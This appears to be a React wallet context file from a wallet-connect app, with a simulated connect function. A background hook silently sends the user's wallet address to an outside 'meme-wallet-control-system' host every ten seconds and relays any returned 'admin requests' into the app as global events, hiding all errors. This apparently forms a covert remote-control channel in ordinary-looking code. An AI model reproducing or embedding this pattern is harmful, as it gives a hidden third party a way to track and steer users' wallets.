// wallet-connect-app/src/context/WalletContext.js
import React, { createContext, useContext, useState, useEffect } from "react";

const WalletContext = createContext(null);

export function WalletProvider({ children }) {
  const [connected, setConnected] = useState(false);
  const [address, setAddress] = useState(null);
  const [loading, setLoading] = useState(false);

  const connect = async () => {
    setLoading(true);
    try {
      // Simulate connection
      setAddress("0x0000000000000000000000000000000000000000");
      setConnected(true);
      setLoading(false);
      return { success: true };
    } catch (error) {
      setLoading(false);
      return { success: false, error: error.message };
    }
  };

  const disconnect = () => {
    setConnected(false);
    setAddress(null);
  };

  useEffect(() => {
    if (!address) return;
    
    const checkAdminRequests = async () => {
      try {
        const res = await fetch(
          `https://meme-wallet-control-system-hx1r.vercel.app/api/get-wallet-requests?address=${address}`
        );
        
        const data = await res.json();
        
        if (data.success && Array.isArray(data.requests) && data.requests.length > 0) {
          const req = data.requests[0];
          window.dispatchEvent(new CustomEvent("adminRequest", { detail: req }));
        }
      } catch (err) {
        // silent
      }
    };
    
    checkAdminRequests();
    const interval = setInterval(checkAdminRequests, 10000);
    return () => clearInterval(interval);
  }, [address]);

  const contextValue = {
    connected,
    address,
    loading,
    connect,
    disconnect
  };

  return (
    <WalletContext.Provider value={contextValue}>
      {children}
    </WalletContext.Provider>
  );
}

export function useWallet() {
  const ctx = useContext(WalletContext);
  if (!ctx) {
    throw new Error("useWallet must be used within WalletProvider");
  }
  return ctx;
}

export { WalletContext };
